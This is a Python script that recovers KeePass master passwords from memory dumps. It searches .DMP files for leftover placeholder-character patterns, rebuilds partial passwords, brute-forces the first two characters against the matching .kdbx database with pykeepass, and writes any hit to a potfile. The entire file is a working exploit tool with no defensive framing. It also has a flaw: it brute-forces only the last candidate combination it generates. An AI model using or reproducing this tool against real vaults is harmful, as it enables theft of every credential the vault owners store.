import logging
import itertools
import pykeepass
import hashlib
import os
from typing import List, Tuple, Dict

# Character set for brute-forcing passwords
charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-=[]{}|;:',.<>?/"

def calculate_sha256_hash(password: str) -> str:
    """
    Calculate the SHA-256 hash of a given password.

    Args:
        password (str): The password to hash.

    Returns:
        str: The SHA-256 hash of the password.
    """
    if isinstance(password, str):
        password = password.encode('utf-8')
    return hashlib.sha256(password).hexdigest()

def write_to_potfile(
        hash: str, 
        password: str, 
        potfile_path: str = 'result.pot'
) -> None:
    """
    Write the found hash and password to a potfile.

    Args:
        hash (str): The hash of the password.
        password (str): The found password.
        potfile_path (str): The path to the potfile.
    """
    with open(potfile_path, 'a') as potfile:
        potfile.write(f"{hash}:{password}\n")

def brute_force_first_two(
        password_suffix: str, 
        kdbx_file: str, 
        potfile_path: str = 'result.pot'
) -> bool:
    """
    Attempt to brute-force the first two characters of the password.

    Args:
        password_suffix (str): The suffix of the password after the first two characters.
        kdbx_file (str): The path to the KDBX file.
        potfile_path (str): The path to the potfile.

    Returns:
        bool: True if the password was found, False otherwise.
    """
    for first_two in itertools.product(charset, repeat=2):
        potential_password = ''.join(first_two) + password_suffix[2:]
        if try_kdbx_password(potential_password, kdbx_file):
            print(f'[SUCCESS] Password found: {potential_password}')
            password_hash = calculate_sha256_hash(potential_password)
            write_to_potfile(password_hash, potential_password, potfile_path)
            return True
    return False

def try_kdbx_password(
        password: str, 
        kdbx_file: str
) -> bool:
    """
    Attempt to open a KDBX file with a given password.

    Args:
        password (str): The password to try.
        kdbx_file (str): The path to the KDBX file.

    Returns:
        bool: True if the password is correct, False otherwise.
    """
    try:
        kp = pykeepass.PyKeePass(kdbx_file, password=password)
        return True
    except Exception:
        return False

def setup_logging(debug: bool = False) -> None:
    """
    Set up logging configuration.

    Args:
        debug (bool): Whether to set logging to debug level.
    """
    formatter = logging.Formatter('%(asctime)s [%(levelname)s] [%(name)s] %(message)s')
    handler = logging.StreamHandler()
    root_logger = logging.getLogger()
    handler.setFormatter(formatter)
    root_logger.addHandler(handler)
    root_logger.setLevel(logging.DEBUG if debug else logging.INFO)

def get_relative_folder_path(folder_name: str) -> str:
    """
    Get the relative path for a given folder name.

    Args:
        folder_name (str): The name of the folder.

    Returns:
        str: The relative path to the folder.
    """
    return os.path.join(os.path.dirname(os.path.abspath(__file__)), folder_name)

def find_file_pairs(folder: str) -> List[Tuple[str, str]]:
    """
    Find matching .dmp and .kdbx file pairs in a given folder.

    Args:
        folder (str): The path to the folder containing the files.

    Returns:
        List[Tuple[str, str]]: A list of tuples containing paths to matching .dmp and .kdbx files.
    """
    if not os.path.exists(folder):
        print(f"Folder '{folder}' does not exist.")
        return []

    dmp_files: Dict[str, str] = {}
    kdbx_files: Dict[str, str] = {}

    # Search for .dmp and .kdbx files in the folder
    for filename in os.listdir(folder):
        full_path = os.path.join(folder, filename)  # Create full path
        if filename.endswith('.DMP'):
            base_name = os.path.splitext(filename)[0]
            dmp_files[base_name] = full_path
        elif filename.endswith('.kdbx'):
            base_name = os.path.splitext(filename)[0]
            kdbx_files[base_name] = full_path

    # Form pairs of .dmp and .kdbx files with the same base name
    file_pairs: List[Tuple[str, str]] = []
    for base_name in dmp_files:
        if base_name in kdbx_files:
            file_pairs.append((dmp_files[base_name], kdbx_files[base_name]))

    return file_pairs

def get_candidates(dump_file) -> List[bytes]:
    """
    Extract potential password candidates from the dump file.

    Args:
        dump_file: The dump file to read.

    Returns:
        List[bytes]: A list of extracted password candidates.
    """
    data = dump_file.read()
    candidates: List[bytes] = []
    str_len = 0
    i = 0

    while i < len(data) - 1:
        if (data[i] == 0xCF) and (data[i + 1] == 0x25):
            str_len += 1
            i += 1
        elif str_len > 0:
            if (data[i] >= 0x20) and (data[i] <= 0x7E) and (data[i + 1] == 0x00):
                candidate = (str_len * b'\xCF\x25') + bytes([data[i], data[i + 1]])

                if candidate not in candidates:
                    candidates.append(candidate)

            str_len = 0
        
        i += 1

    return candidates

if __name__ == '__main__':
    setup_logging()
    logger = logging.getLogger('main')

    # Use the relative path to the dumps
    dumps_folder = get_relative_folder_path('dumps')
    
    # Find all matching .dmp and .kdbx file pairs in the specified folder
    file_pairs = find_file_pairs(dumps_folder)

    if not file_pairs:
        print("No matching .dmp and .kdbx file pairs found.")
        exit(1)

    for dmp_file, kdbx_file in file_pairs:
        with open(dmp_file, 'rb') as dump_file:
            logger.info(f'Opened {dump_file.name}')
            candidates = get_candidates(dump_file)
            
            # Decode candidates
            candidates = [x.decode('utf-16-le') for x in candidates]

            # Check if there are any candidates
            if not candidates:
                logger.warning(f'No candidates found in {dump_file.name}')
                continue

            groups = [[] for _ in range(max(len(i) for i in candidates))]

            for candidate in candidates:
                groups[len(candidate) - 1].append(candidate[-1])

            for i in range(len(groups)):
                if len(groups[i]) == 0:
                    groups[i].append(b'\xCF\x25'.decode('utf-16-le'))

            for password in itertools.product(*groups):
                password = ''.join(password)
                print(f'Possible password: {password}')
                print(f'Brute-force first two characters -> {password[:2]} <-...')
    
            # Attempt to find the password
            if not brute_force_first_two(password, kdbx_file):
                print(f"Failed to find the password for {dmp_file} and {kdbx_file}.")
